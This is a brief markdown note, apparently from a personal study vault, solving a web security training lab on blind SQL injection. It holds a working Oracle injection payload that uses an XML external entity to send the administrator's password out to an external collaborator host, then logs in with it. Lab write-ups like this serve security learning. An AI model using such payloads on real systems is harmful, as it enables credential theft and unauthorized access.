---
tags:
  - sqli
  - blind
  - oob
---
# Blind SQL injection with out-of-band data exfiltration

1. Send the following payload to trigger an OOB interaction with the password as a subdomain

```
' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.3898nkw2hx95f6tpasb0pf57ryxplh96.oastify.com/"> %remote;]>'),'/l') FROM dual--
```

![[attachments/sqli-lab-17/file-20260206135416468.png]]

2. Log in as the administrator to solve the lab

